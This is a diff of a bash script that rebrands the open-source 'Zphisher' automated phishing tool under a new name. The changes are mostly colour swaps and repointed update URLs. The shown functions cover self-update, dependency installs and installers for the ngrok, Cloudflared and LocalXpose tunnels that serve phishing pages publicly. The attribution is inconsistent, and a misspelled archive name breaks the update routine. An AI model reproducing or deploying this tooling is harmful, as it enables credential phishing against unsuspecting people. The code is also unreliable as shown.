@@ -1,9 +1,9 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
+##  pitkiller	: 	Automated Phishing Tool
 ##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   Version 	: 	2.3.6
+##   Github 	: 	https://github.com/Praypit/pitkiller/edit/main/pitkiller.sh
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -132,12 +132,12 @@ fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+	{ printf "\n\n%s\n\n" "${PINK}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
 	exit 0
 }
 
 exit_on_signal_SIGTERM() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+	{ printf "\n\n%s\n\n" "${PINK}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
 	exit 0
 }
 
@@ -164,9 +164,9 @@ kill_pid() {
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	relase_url='https://api.github.com/repos/Praypit/pitkiller/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+	tarball_url="https://github.com/Praypit/pitkiller/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -174,28 +174,28 @@ check_update(){
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+		--retry 3 --retry-delay 2 --location --output ".pitkilller.tar.gz" "${tarball_url}"
 
-		if [[ -e ".zphisher.tar.gz" ]]; then
-			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+		if [[ -e ".pitkiller.tar.gz" ]]; then
+			tar -xf .pitkiller.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .zphisher.tar.gz
+			rm -f .pitkiller.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run pitkiller again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+			echo -e "\n${PINK}[${WHITE}!${PINK}]${RED} Error occured while downloading."
 			{ reset_color; exit 1; }
 		fi
 	else
-		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+		echo -ne "${PINK}up to date\n${WHITE}" ; sleep .5
 	fi
 }
 
 ## Check Internet Status
 check_status() {
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	echo -ne "\n${PINK}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
@@ -214,7 +214,7 @@ banner() {
 		${ORANGE}─────────╔═╝║║║
 ${ORANGE}─────────╚══╝╚╝                ${WHITE}Version : ${__version__}
 
-${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Abhi thakur (advance fishing tool)${WHITE}
+${GREEN}[${WHITE}-${GREEN}]${PINK} Tool Created by Abhi thakur (advance fishing tool)${WHITE}
 	EOF
 }
 
@@ -251,7 +251,7 @@ dependencies() {
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${PINK}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -297,7 +297,7 @@ download() {
 		chmod +x .server/$output > /dev/null 2>&1
 		rm -rf "$file"
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		echo -e "\n${PINK}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -305,9 +305,9 @@ download() {
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+		echo -e "\n${PINK}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${PINK}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
@@ -324,9 +324,9 @@ install_ngrok() {
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+		echo -e "\n${PINK}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${PINK}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -343,9 +343,9 @@ install_cloudflared() {
 ## Install LocalXpose
 install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+		echo -e "\n${PINK}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		echo -e "\n${PINK}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
@@ -362,7 +362,7 @@ install_localxpose() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${WHITE} Thank you for using this tool. Have a good day.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -370,26 +370,26 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
-		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
+		${PINK} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${PINK} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
+		${PINK} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${PINK} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
-		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
+		  only ${PINK}!${WHITE}${CYAN} Author will not be responsible for 
 		  any misuse of this toolkit ${RED}!${WHITE}
 		
 		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
+		${PINK}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
 		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
 		  Yisus7u7
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${PINK}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${PINK}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 	case $REPLY in 
 		99)
 			msg_exit;;
